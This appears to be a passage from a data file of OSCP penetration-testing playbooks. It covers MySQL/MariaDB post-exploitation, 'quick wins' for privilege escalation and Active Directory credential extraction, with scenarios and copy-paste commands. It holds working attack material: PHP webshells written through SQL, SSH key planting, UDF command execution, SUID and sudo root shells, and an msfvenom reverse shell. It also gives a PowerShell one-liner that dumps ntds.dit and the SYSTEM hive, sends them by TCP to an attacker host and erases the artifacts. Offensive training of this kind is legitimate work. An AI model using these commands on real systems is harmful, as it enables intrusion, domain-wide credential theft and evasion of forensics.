""Phase 8: Credential Leveraging and Automation"", ""notes"": ""Test found credentials with runas (requires GUI) or evil-winrm. Run WinPEAS for automated enumeration of privilege escalation vectors. WinPEAS may miss findings - always verify manually."", ""commands"": [{""id"": ""win-privesc-winpeas"", ""example"": ""winPEASany.exe"", ""shows"": ""RED highlights for vulnerabilities: Unquoted Service Paths, AlwaysInstallElevated, AutoLogon credentials...""}, {""id"": ""win-runas-cmd"", ""example"": ""runas /user:backupadmin cmd"", ""shows"": ""Enter password for backupadmin: (new window opens as backupadmin)""}]}]"
"mariadb-mysql-enumeration","MariaDB/MySQL Enumeration and Privilege Escalation","Comprehensive MariaDB/MySQL post-exploitation methodology for credential extraction, privilege escalation, and lateral movement. Covers database enumeration, user hunting, file operations, and UDF attacks.","MYSQL|MARIADB|DATABASE|POST_EXPLOITATION|CREDENTIAL_HUNTING|PRIVILEGE_ESCALATION|FILE_READ|UDF|OSCP:HIGH","{""how_to_recognize"": [""You discovered MySQL/MariaDB on port 3306 during enumeration"", ""You gained access to a box running XAMPP, WAMP, LAMP stack"", ""You found database credentials in config files (my.ini, wp-config.php)"", ""MySQL is running and you need to extract credentials for pivoting""], ""when_to_look_for"": [""After compromising a web server with backend database"", ""When you find database credentials in config files"", ""During post-exploitation to harvest stored credentials"", ""When MySQL is only accessible from localhost (need tunnel or local shell)""], ""key_concepts"": [""Default MySQL root has no password in XAMPP/WAMP installations"", ""MySQL host restrictions: root@localhost differs from root@% - check mysql.user for allowed hosts"", ""FILE privilege enables reading/writing files on the filesystem"", ""UDF (User Defined Functions) can execute system commands if plugin_dir is writable"", ""secure_file_priv: NULL = disabled, empty = anywhere, path = restricted to that directory""]}","[{""title"": ""Scenario 1: Initial Database Access"", ""context"": ""You gained shell on a Windows/Linux box running MySQL/MariaDB. You need to test authentication and enumerate the database for credentials."", ""approach"": ""Try default credentials (root with no password), then enumerate version, users, and databases. Look for credential-related databases and tables."", ""commands"": [""mysql-connect-nopass"", ""mysql-version"", ""mysql-current-user"", ""mysql-show-databases"", ""mysql-list-users""], ""expected_outcome"": ""Gain database access, identify version for CVE research, discover databases like 'creds', 'users', 'webapp' containing application credentials that may be reused for Windows/Linux accounts."", ""why_this_works"": ""XAMPP/WAMP default installations have no root password. Developers often store application credentials in databases. Password reuse between database and system accounts is extremely common.""}, {""title"": ""Scenario 2: Credential Extraction from Databases"", ""context"": ""You have MySQL access and found interesting databases. You need to systematically extract stored credentials for lateral movement."", ""approach"": ""List all tables, identify credential-related tables (users, accounts, credentials, admins), dump their contents. Search for password columns across all databases."", ""commands"": [""mysql-show-tables"", ""mysql-describe-table"", ""mysql-dump-table"", ""mysql-search-password-columns"", ""mysql-dump-all-users""], ""expected_outcome"": ""Extract plaintext or hashed passwords. Plaintext can be used directly for pivoting. Hashes can be cracked (MD5, bcrypt, etc.) or used in pass-the-hash scenarios depending on the application."", ""why_this_works"": ""Web applications store user credentials in databases. Many use weak hashing (MD5, SHA1) or even plaintext. Credentials often match domain or local Windows accounts due to password reuse.""}, {""title"": ""Scenario 3: MySQL User Privilege Enumeration"", ""context"": ""You need to understand what privileges your MySQL user has for potential privilege escalation vectors (file read/write, UDF)."", ""approach"": ""Check current grants, then query mysql.user for dangerous privileges: File_priv, Super_priv, Process_priv. Check secure_file_priv restrictions."", ""commands"": [""mysql-show-grants"", ""mysql-check-file-priv"", ""mysql-check-dangerous-privs"", ""mysql-check-secure-file-priv"", ""mysql-check-plugin-dir""], ""expected_outcome"": ""Identify if FILE privilege is available (read/write files), SUPER privilege (UDF loading), and whether secure_file_priv restricts file operations. Empty secure_file_priv = write anywhere."", ""why_this_works"": ""MySQL privileges map to system-level capabilities. FILE privilege allows reading sensitive files (/etc/shadow, config files) and writing webshells. SUPER allows loading UDF for command execution.""}, {""title"": ""Scenario 4: File System Access via MySQL"", ""context"": ""Your MySQL user has FILE privilege. You want to read sensitive files or write a webshell for persistent access."", ""approach"": ""Use LOAD_FILE() to read system files (passwd, shadow, web configs). Use INTO OUTFILE to write webshells to web root if writable."", ""commands"": [""mysql-read-file-linux"", ""mysql-read-file-windows"", ""mysql-read-config"", ""mysql-write-webshell-linux"", ""mysql-write-webshell-windows""], ""expected_outcome"": ""Read /etc/passwd, /etc/shadow (if MySQL runs as root), web config files with additional credentials. Write PHP webshell to htdocs for persistent command execution."", ""why_this_works"": ""LOAD_FILE reads files as the MySQL service user (often root on Linux, SYSTEM on Windows). INTO OUTFILE writes files with MySQL user permissions. Web roots are often world-writable for deployment.""}, {""title"": ""Scenario 5: UDF Privilege Escalation (Linux)"", ""context"": ""You have SUPER and FILE privileges on a Linux MySQL installation. You want to execute system commands for privilege escalation."", ""approach"": ""Check plugin_dir location, verify it's writable, upload UDF shared library, create function, execute commands as MySQL service user."", ""commands"": [""mysql-check-plugin-dir"", ""mysql-check-plugin-dir-writable"", ""mysql-create-udf-function"", ""mysql-exec-udf-command""], ""expected_outcome"": ""Execute system commands as the MySQL service user. On older systems this may be root. Can add SSH keys, create users, or execute reverse shell."", ""why_this_works"": ""UDF allows loading arbitrary shared libraries that execute as the MySQL process. If MySQL runs as root, you get root command execution. Even as mysql user, you may find sudoers entries or other privilege escalation paths.""}, {""title"": ""Scenario 6: Remote Access Setup via Tunneling"", ""context"": ""MySQL only accepts localhost connections (root@localhost). You need to access it from your attack box for easier enumeration."", ""approach"": ""Use SSH tunnel, chisel, or ligolo to forward port 3306 from target to attacker. Then connect with full MySQL client capabilities."", ""commands"": [""mysql-check-bind-address"", ""tunnel-chisel-reverse"", ""tunnel-ssh-local"", ""mysql-grant-remote""], ""expected_outcome"": ""Access MySQL from Kali with full client features (tab completion, easier dumping, mysql-dump). Alternatively, grant remote access by creating root@% user."", ""why_this_works"": ""MySQL bind-address and user@host restrictions limit connections. Tunneling bypasses network restrictions while appearing as localhost. Granting remote access modifies MySQL ACLs directly.""}]","[{""title"": ""Phase 1: Connection and Basic Enumeration"", ""notes"": ""First establish database access. Try default credentials, then gather version and user information. Version determines available exploits and features."", ""commands"": [{""id"": ""mysql-connect-nopass"", ""example"": ""mysql -h 127.0.0.1 -u root"", ""shows"": ""Welcome to the MariaDB monitor. Server version: 10.3.24-MariaDB""}, {""id"": ""mysql-connect-password"", ""example"": ""mysql -h 127.0.0.1 -u root -p'password123'"", ""shows"": ""Welcome to the MariaDB monitor.""}, {""id"": ""mysql-version"", ""example"": ""SELECT VERSION(); SELECT @@version;"", ""shows"": ""10.3.24-MariaDB""}, {""id"": ""mysql-current-user"", ""example"": ""SELECT user(); SELECT current_user();"", ""shows"": ""root@localhost""}, {""id"": ""mysql-hostname"", ""example"": ""SELECT @@hostname;"", ""shows"": ""ERA""}, {""id"": ""mysql-datadir"", ""example"": ""SELECT @@datadir; SELECT @@basedir;"", ""shows"": ""/var/lib/mysql/ or C:\\xampp\\mysql\\data\\""}]}, {""title"": ""Phase 2: Database and Table Discovery"", ""notes"": ""Enumerate all databases and tables. Look for credential-related names: creds, users, accounts, passwords, admin, config."", ""commands"": [{""id"": ""mysql-show-databases"", ""example"": ""SHOW DATABASES;"", ""shows"": ""creds, information_schema, mysql, performance_schema, phpmyadmin, webapp""}, {""id"": ""mysql-show-tables"", ""example"": ""USE creds; SHOW TABLES;"", ""shows"": ""users, credentials, api_keys, admin_accounts""}, {""id"": ""mysql-describe-table"", ""example"": ""DESCRIBE users; SHOW COLUMNS FROM credentials;"", ""shows"": ""id INT, username VARCHAR, password VARCHAR, email VARCHAR""}, {""id"": ""mysql-dump-table"", ""example"": ""SELECT * FROM creds.users;"", ""shows"": ""1, admin, Password123!, admin@secura.yzx""}, {""id"": ""mysql-search-password-columns"", ""example"": ""SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%pwd%' OR column_name LIKE '%cred%' OR column_name LIKE '%secret%';"", ""shows"": ""webapp, users, password | creds, api_keys, secret_key""}, {""id"": ""mysql-search-user-columns"", ""example"": ""SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%user%' OR column_name LIKE '%login%' OR column_name LIKE '%admin%' OR column_name LIKE '%email%';"", ""shows"": ""webapp, users, username | webapp, users, email""}]}, {""title"": ""Phase 3: MySQL User and Privilege Enumeration"", ""notes"": ""Understand MySQL user landscape. Extract password hashes for offline cracking. Check for dangerous privileges that enable file access or code execution."", ""commands"": [{""id"": ""mysql-list-users"", ""example"": ""SELECT user, host FROM mysql.user;"", ""shows"": ""root@localhost, root@127.0.0.1, pma@localhost, webapp@%""}, {""id"": ""mysql-dump-all-users"", ""example"": ""SELECT user, host, password FROM mysql.user;"", ""shows"": ""root, localhost, *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 (password123)""}, {""id"": ""mysql-dump-users-new"", ""example"": ""SELECT user, host, authentication_string FROM mysql.user;"", ""shows"": ""For MySQL 5.7+ where password column renamed""}, {""id"": ""mysql-show-grants"", ""example"": ""SHOW GRANTS; SHOW GRANTS FOR current_user();"", ""shows"": ""GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost'""}, {""id"": ""mysql-check-file-priv"", ""example"": ""SELECT File_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(current_user(),'@',1);"", ""shows"": ""Y (can read/write files)""}, {""id"": ""mysql-check-dangerous-privs"", ""example"": ""SELECT user, host, File_priv, Super_priv, Process_priv FROM mysql.user;"", ""shows"": ""root, localhost, Y, Y, Y""}]}, {""title"": ""Phase 4: File System Operations"", ""notes"": ""If FILE privilege is available, read sensitive files and write webshells. Check secure_file_priv first - empty value means unrestricted."", ""commands"": [{""id"": ""mysql-check-secure-file-priv"", ""example"": ""SHOW VARIABLES LIKE 'secure_file_priv';"", ""shows"": ""NULL=disabled, empty=anywhere, /path/=restricted""}, {""id"": ""mysql-read-file-linux"", ""example"": ""SELECT LOAD_FILE('/etc/passwd');"", ""shows"": ""root:x:0:0:root:/root:/bin/bash...""}, {""id"": ""mysql-read-file-windows"", ""example"": ""SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts');"", ""shows"": ""127.0.0.1 localhost...""}, {""id"": ""mysql-read-config"", ""example"": ""SELECT LOAD_FILE('C:/xampp/htdocs/config.php');"", ""shows"": ""$db_password = 'secretpass123';""}, {""id"": ""mysql-write-webshell-linux"", ""example"": ""SELECT '<?php system($_GET[\""cmd\""]); ?>' INTO OUTFILE '/var/www/html/shell.php';"", ""shows"": ""Query OK, 1 row affected""}, {""id"": ""mysql-write-webshell-windows"", ""example"": ""SELECT '<?php system($_GET[\""cmd\""]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';"", ""shows"": ""Query OK, 1 row affected""}, {""id"": ""mysql-write-ssh-key"", ""example"": ""SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/root/.ssh/authorized_keys';"", ""shows"": ""Adds SSH key for root access (if MySQL runs as root)""}]}, {""title"": ""Phase 5: UDF Privilege Escalation"", ""notes"": ""User Defined Functions allow loading shared libraries for command execution. Requires SUPER privilege and writable plugin directory. Most effective on Linux."", ""commands"": [{""id"": ""mysql-check-plugin-dir"", ""example"": ""SHOW VARIABLES LIKE 'plugin_dir'; SELECT @@plugin_dir;"", ""shows"": ""/usr/lib/mysql/plugin/ or C:\\xampp\\mysql\\lib\\plugin\\""}, {""id"": ""mysql-create-udf-function"", ""example"": ""CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';"", ""shows"": ""Query OK (after uploading UDF library to plugin_dir)""}, {""id"": ""mysql-exec-udf-command"", ""example"": ""SELECT sys_exec('id > /tmp/output.txt');"", ""shows"": ""0 (success), check /tmp/output.txt for command output""}, {""id"": ""mysql-drop-udf"", ""example"": ""DROP FUNCTION sys_exec;"", ""shows"": ""Cleanup after exploitation""}]}, {""title"": ""Phase 6: Tunneling for Remote Access"", ""notes"": ""When MySQL only allows localhost connections, tunnel through compromised host. Chisel reverse port forward is most reliable through firewalls."", ""commands"": [{""id"": ""mysql-check-bind-address"", ""example"": ""SHOW VARIABLES LIKE 'bind_address';"", ""shows"": ""127.0.0.1 (localhost only) or 0.0.0.0 (all interfaces)""}, {""id"": ""tunnel-chisel-server"", ""example"": ""chisel server -p 8080 --reverse"", ""shows"": ""Run on Kali - listens for chisel client connections""}, {""id"": ""tunnel-chisel-client"", ""example"": "".\\chisel.exe client KALI_IP:8080 R:3306:127.0.0.1:3306"", ""shows"": ""Run on target - forwards local MySQL to Kali""}, {""id"": ""tunnel-ssh-local"", ""example"": ""ssh -L 3306:127.0.0.1:3306 user@target"", ""shows"": ""SSH local forward if you have SSH access""}, {""id"": ""mysql-grant-remote"", ""example"": ""GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY ''; FLUSH PRIVILEGES;"", ""shows"": ""Allow root from any host (less stealthy)""}]}, {""title"": ""Phase 7: Hash Cracking"", ""notes"": ""MySQL password hashes can be cracked offline. MySQL 4.1+ uses SHA1-based hashing. Extract hashes and crack with hashcat."", ""commands"": [{""id"": ""mysql-extract-hash"", ""example"": ""SELECT user, password FROM mysql.user WHERE password != '';"", ""shows"": ""*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19""}, {""id"": ""hashcat-mysql41"", ""example"": ""hashcat -m 300 mysql_hashes.txt /usr/share/wordlists/rockyou.txt"", ""shows"": ""Crack MySQL 4.1+ hashes (mode 300)""}, {""id"": ""hashcat-mysql323"", ""example"": ""hashcat -m 200 mysql_hashes.txt /usr/share/wordlists/rockyou.txt"", ""shows"": ""Crack old MySQL 3.23 hashes (mode 200)""}]}]"
"quick-wins","Quick Wins - OSCP Low-Hanging Fruit","Fast enumeration checks that frequently lead to immediate compromise in OSCP labs and exams","OSCP:HIGH|QUICK_WIN|ENUMERATION|PRIVESC|TIME_SENSITIVE","{""how_to_recognize"": [""Services running with default credentials (anonymous FTP, weak admin passwords)"", ""Overly permissive file/directory permissions (world-writable configs, SUID binaries)"", ""Unpatched services with public exploits (outdated SMB, Apache, ProFTPD versions)"", ""Information disclosure via error messages, robots.txt, directory listings"", ""Misconfigurations exposing sensitive data (exposed .git directories, backup files)"", ""Weak authentication mechanisms (no password on SMB shares, sudo NOPASSWD entries)""], ""when_to_look_for"": [""Immediately after initial nmap scan shows services (before detailed enumeration)"", ""When time is limited (last 30-60 minutes of OSCP exam)"", ""After gaining initial foothold (check for immediate privesc paths)"", ""When stuck on a box for >1 hour (step back, check basics)"", ""Before running time-consuming scans (LinPEAS, winPEAS, full Nmap)"", ""When service versions are 5+ years old (likely unpatched vulnerabilities)""]}","[{""title"": ""Scenario 1: Anonymous FTP with Writable Web Root"", ""context"": ""Target: FTP (21) and HTTP (80) open. Nmap shows 'Anonymous FTP login allowed'. Goal: Check if FTP root maps to web server document root for quick RCE."", ""approach"": ""Step 1: Connect anonymously: ftp <TARGET>, username 'anonymous', password blank. Step 2: List files, check for web-related paths (/var/www/html, /srv/http, /home/*/public_html). Step 3: Test write access: put test.txt. Step 4: If successful, upload PHP shell: put shell.php. Step 5: Access via browser: http://<TARGET>/shell.php?cmd=whoami."", ""commands"": [""curl-post""], ""expected_outcome"": ""FTP shows 226 Transfer complete on PUT command. Browser request to shell.php returns www-data. Time investment: 2-3 minutes. Success rate in OSCP: ~15% of boxes with anonymous FTP. Next steps: Upgrade to reverse shell, enumerate for privesc. Alternative: If write fails but read works, check for config files with credentials (config.php, database.yml, .env)."", ""why_this_works"": ""Common misconfiguration where FTP root (often /var/ftp or /srv/ftp) is symlinked or mapped to web root. FTP allows anonymous upload without validation, web server executes uploaded PHP without restrictions. Often seen in: Development/staging servers ported to production, Quick-setup web hosting with vsftpd+Apache, Legacy systems with inherited bad configs. OSCP frequency: Higher in older lab boxes (legacy), lower in newer exam machines.""}, {""title"": ""Scenario 2: Linux - SUID Binaries with GTFOBins Exploits"", ""context"": ""Target: SSH access as low-privilege user (jim). Goal: Find SUID binaries that allow privilege escalation without exploits."", ""approach"": ""Step 1: Find SUID binaries: find / -perm -4000 2>/dev/null. Step 2: Cross-reference with GTFOBins (https://gtfobins.github.io/) for SUID exploits. Common quick wins: /usr/bin/find, /usr/bin/vim, /usr/bin/nano, /usr/bin/cp, /usr/bin/mv, /usr/bin/less, /usr/bin/more. Step 3: Example with find: find . -exec /bin/sh -p \\; (spawns root shell). Step 4: Verify root: id (should show uid=0)."", ""commands"": [""check-sudo-privs""], ""expected_outcome"": ""First command lists 10-30 SUID binaries (normal). Look for unusual entries (find, vim, nano = red flags). find exploit gives root shell in <10 seconds. Other quick wins: vim -c ':!/bin/sh' (if vim SUID), cp /etc/shadow /tmp/shadow && read hashes (if cp SUID). Time investment: 1-2 minutes to check, instant exploitation. OSCP success rate: ~25% of Linux boxes have exploitable SUID binary."", ""why_this_works"": ""SUID bit allows binary to run with owner's privileges (usually root). Intended for legitimate admin tools (passwd, ping, su). Misapplication to editors/file managers creates instant root access. Why admins do this: Convenience (avoid sudo repeatedly), Legacy scripts requiring SUID, Misunderstanding of security implications. GTFOBins maintains current list of exploitable SUID binaries. OSCP tip: Memorize top 5 SUID exploits (find, vim, nmap, bash, less) for speed.""}, {""title"": ""Scenario 3: Windows - Unquoted Service Paths"", ""context"": ""Target: Windows 10/Server 2016 with standard user access (bob). Services running with unquoted paths and writable directories. Goal: Hijack service execution for SYSTEM shell."", ""approach"": ""Step 1: Find unquoted service paths: wmic service get name,pathname | findstr /i /v \""C:\\Windows\\\\\"" | findstr /i /v \""\\\""\"". Step 2: Check write permissions: icacls \""C:\\Program Files\\Vulnerable Service\"". Step 3: Create malicious executable: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o Program.exe. Step 4: Copy to exploitable path: copy Program.exe \""C:\\Program.exe\"". Step 5: Restart service: sc stop VulnService && sc start VulnService."", ""commands"": [""curl-post""], ""expected_outcome"": ""Step 1 shows services like: C:\\Program Files\\Vulnerable Service\\service.exe (unquoted, space in path). Step 2 shows: BUILTIN\\Users:(OI)(CI)(M) (write access confirmed). Service restart triggers C:\\Program.exe execution as SYSTEM. Reverse shell connects with nt authority\\system privileges. Time investment: 5-10 minutes. OSCP frequency: ~30% of Windows boxes (common misconfiguration)."", ""why_this_works"": ""Windows path resolution ambiguity with spaces and no quotes. Path: C:\\Program Files\\Vulnerable Service\\service.exe resolves as: 1) C:\\Program.exe (if exists), 2) C:\\Program Files\\Vulnerable.exe (if exists), 3) C:\\Program Files\\Vulnerable Service\\service.exe (actual). Services run as SYSTEM by default. If C:\\ is writable (often true for BUILTIN\\Users), attacker drops Program.exe, service executes it as SYSTEM. Why common: Lazy installer scripts, Third-party software not following MS best practices, Legacy software never patched. OSCP defense: Always quote service paths in install scripts.""}]","[{""title"": ""Phase 1: Service-Level Quick Wins (Immediate)"", ""notes"": ""Check before detailed enumeration. Takes 5-10 minutes total. High success rate in OSCP (40-50% of boxes have at least one quick win)."", ""commands"": [{""id"": ""check-sudo-privs"", ""example"": ""sudo -l"", ""shows"": ""User <username> may run the following commands""}, {""id"": ""curl-post"", ""example"": ""curl -X POST -d 'username=admin' http://192.168.1.100/login.php"", ""shows"": ""200 OK""}]}, {""title"": ""Phase 2: Web Application Quick Wins"", ""notes"": ""After confirming HTTP/HTTPS services. Common quick wins: Default credentials (admin:admin, admin:password), Exposed admin panels (/admin, /manager), Directory listing enabled, LFI/RFI vulnerabilities, Outdated CMS (WordPress, Drupal, Joomla with known exploits)."", ""commands"": [{""id"": ""curl-post"", ""example"": ""curl -X POST -d 'username=admin' http://192.168.1.100/login.php"", ""shows"": ""200 OK""}, {""id"": ""lfi-test"", ""example"": ""../../../../../../etc/passwd"", ""shows"": ""root:x:0:0""}]}, {""title"": ""Phase 3: Post-Compromise Quick Wins (Linux)"", ""notes"": ""After initial foothold. Run immediately before full LinPEAS scan. Checks: sudo -l (NOPASSWD entries), find / -perm -4000 (SUID binaries), ls -la /etc/cron* (writable cron jobs), cat /etc/exports (NFS shares with no_root_squash), docker ps (Docker group membership)."", ""commands"": [{""id"": ""check-sudo-privs"", ""example"": ""sudo -l"", ""shows"": ""User <username> may run the following commands""}, {""id"": ""sudo-exploit-find"", ""example"": ""sudo find . -exec /bin/bash \\; -quit"", ""shows"": ""bash-5.0# prompt (root shell)""}]}, {""title"": ""Phase 4: Post-Compromise Quick Wins (Windows)"", ""notes"": ""After initial foothold. Run before full winPEAS scan. Checks: whoami /priv (SeImpersonatePrivilege = potato attacks), accesschk.exe -uwcqv (unquoted service paths), reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated (MSI privesc), net localgroup administrators (admin group membership), cmdkey /list (stored credentials)."", ""commands"": [{""id"": ""curl-post"", ""example"": ""curl -X POST -d 'username=admin' http://192.168.1.100/login.php"", ""shows"": ""200 OK""}]}]"
"windows-ad-credential-oneliners","Windows AD Credential Extraction One-Liners","Complete Active Directory credential extraction one-liners combining VSS shadow copies, registry dumps, exfiltration, and offline parsing into single-command workflows for rapid OSCP exploitation.","ONE_LINER|OSCP:HIGH|WINDOWS|ACTIVE_DIRECTORY|CREDENTIAL_ACCESS|VSS|NTDS|TCP_EXFIL|POWERSHELL|QUICK_REFERENCE","{""how_to_recognize"": [""You have local Administrator access on a Domain Controller"", ""DCSync unavailable (no replication rights) but need all domain credentials"", ""Need to exfiltrate NTDS.dit + SYSTEM without manual multi-step process"", ""Time-critical credential extraction requiring minimal keystrokes"", ""Network connectivity exists from DC to your Kali attack machine""], ""when_to_look_for"": [""POST-EXPLOITATION: After gaining DC local admin (Evil-WinRM, PSExec, RDP)"", ""CREDENTIAL HARVESTING: When DCSync fails but need complete domain dump"", ""OSCP EXAM: Maximum credential harvest with minimum time investment"", ""LATERAL MOVEMENT PREP: Extracting hashes for mass Pass-the-Hash campaigns"", ""GOLDEN TICKET: Need krbtgt hash for Kerberos persistence""], ""prerequisites"": [""Local Administrator on Domain Controller"", ""PowerShell 5.0+ on target (for Compress-Archive)"", ""vshadow.exe uploaded to DC (or use vssadmin variant)"", ""Network connectivity: DC can reach Kali on specified port"", ""Netcat + Impacket on Kali""]}","[{""title"": ""Scenario: Complete NTDS.dit Extraction + TCP Exfil + Parse (One-liner Combo)"", ""context"": ""You have an Evil-WinRM session as local admin on DC01. Need to extract ALL domain credentials for lateral movement and Golden Ticket persistence. DCSync unavailable (user lacks replication rights). Network connectivity exists from DC to your Kali on port 9001."", ""approach"": ""TWO-PHASE ONE-LINER WORKFLOW:\n\nPhase 1 - Attacker (Kali): Start listener FIRST\n- Run nc listener with auto-unzip and secretsdump parsing\n- Listener waits for incoming zip file from DC\n\nPhase 2 - Target (DC): Execute PowerShell one-liner\n- Single command creates VSS shadow, extracts ntds.dit + SYSTEM\n- Compresses both files to zip, sends via TCP socket\n- Auto-cleans all artifacts on DC\n\nPhase 3 - Automatic Parsing\n- Listener receives zip, auto-extracts, runs secretsdump\n- All domain credentials printed to terminal\n- krbtgt hash extracted for Golden Ticket"", ""commands"": [""post-nc-receive-zip-secretsdump"", ""post-vss-ntds-exfil-combo""], ""expected_outcome"": ""Complete domain credential extraction in <5 minutes. Output: All NTLM hashes in domain\\user:RID:LM:NTLM format, Kerberos keys (AES256, AES128), krbtgt hash for Golden Ticket. No artifacts remain on DC after execution."", ""why_this_works"": ""Combines 8+ manual steps into single PowerShell execution. VSS shadow copy bypasses locked NTDS.dit file. TCP socket exfil avoids SMB server setup complexity. Compress-Archive reduces transfer size and simplifies file handling. Auto-cleanup removes forensic artifacts.""}, {""title"": ""Scenario: Native vssadmin Variant (No vshadow.exe Required)"", ""context"": ""Same as above but vshadow.exe not uploaded to DC. Need to use native Windows utilities only for LOLBAS approach."", ""approach"": ""Same two-phase workflow but replace vshadow.exe with native vssadmin:\n\n1. Attacker side identical (nc listener)\n2. Target one-liner uses vssadmin create shadow /for=C: instead of vshadow.exe\n3. Slightly slower shadow creation (30-60s vs 5-10s) but no upload needed"", ""commands"": [""post-nc-receive-zip-secretsdump""], ""expected_outcome"": ""Same credential output with ~30 second additional shadow creation time. Zero tool uploads - pure living-off-the-land approach."", ""why_this_works"": ""vssadmin is native Windows utility (no upload IOC). Writers enabled by default (cannot use -nw flag) adds time but maintains functionality. Ideal when file uploads blocked or for reduced forensic footprint.""}]","[{""title"": ""VSS NTDS.dit Extraction + TCP Exfil One-Liners"", ""notes"": ""Complete AD credential extraction one-liners for OSCP.\n\nWORKFLOW:\n1. START LISTENER FIRST on Kali (critical - TCP is one-shot)\n2. Execute target-side PowerShell one-liner on DC\n3. Wait for transfer (30sec-2min depending on NTDS.dit size)\n4. Credentials auto-extracted and displayed\n\nOSCP EXAM RELEVANCE: HIGH\n- Alternative to DCSync when replication rights unavailable\n- Complete domain dump in single command execution\n- Provides krbtgt hash for Golden Ticket persistence\n- Works on any DC with local admin access\n\nCOMMON USE CASES:\n- Post-exploitation credential harvesting on DC\n- Lateral movement preparation (mass PTH)\n- Golden Ticket creation for persistence\n- Offline hash cracking (hashcat -m 1000)\n\nTIME ESTIMATES:\n- vshadow variant: 2-4 minutes total\n- vssadmin variant: 3-5 minutes total\n- Parsing: <1 minute regardless of domain size"", ""commands"": [{""id"": ""post-nc-receive-zip-secretsdump"", ""example"": ""nc -lvnp 9001 -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL"", ""shows"": ""Listening on 0.0.0.0 <PORT>""}, {""id"": ""post-vss-ntds-exfil-combo"", ""example"": ""$DRIVE=\""C:\""; $LHOST=\""192.168.45.xxx\""; $LPORT=9001; $VSHADOW=\""C:\\Tools\\vshadow.exe\""; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \""mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\""; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \""rmdir C:\\sc\""; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\""C:\\loot.zip\""); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force"", ""shows"": ""Shadow copy set succesfully created (vshadow output)""}]}, {""title"": ""Quick Reference - Copy-Paste Commands"", ""notes"": ""STEP 1 - KALI (start first):\nnc -lvnp 9001 -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL\n\nSTEP 2 - DC (with vshadow.exe):\n$DRIVE=\""C:\""; $LHOST=\""<YOUR_KALI_IP>\""; $LPORT=9001; $VSHADOW=\""C:\\Tools\\vshadow.exe\""; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \""mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\""; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \""rmdir C:\\sc\""; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\""C:\\loot.zip\""); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force\n\nSTEP 2 - DC (native vssadmin - no upload):\n$DRIVE=\""C:\""; $LHOST=\""<YOUR_KALI_IP>\""; $LPORT=9001; $out=vssadmin create shadow /for=$DRIVE | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \""mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\""; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \""rmdir C:\\sc\""; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\""C:\\loot.zip\""); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force\n\nKEY HASHES TO EXTRACT:\n- Administrator:500 - Domain Admin for PTH\n- krbtgt:502 - Golden Ticket creation\n- Service accounts - Often crackable passwords"", ""commands"": [{""id"": ""post-nc-receive-zip-secretsdump"", ""example"": ""nc -lvnp 9001 -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL"", ""shows"": ""Listening on 0.0.0.0 <PORT>""}, {""id"": ""post-vss-ntds-exfil-combo"", ""example"": ""$DRIVE=\""C:\""; $LHOST=\""192.168.45.xxx\""; $LPORT=9001; $VSHADOW=\""C:\\Tools\\vshadow.exe\""; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \""mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\""; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \""rmdir C:\\sc\""; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\""C:\\loot.zip\""); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); 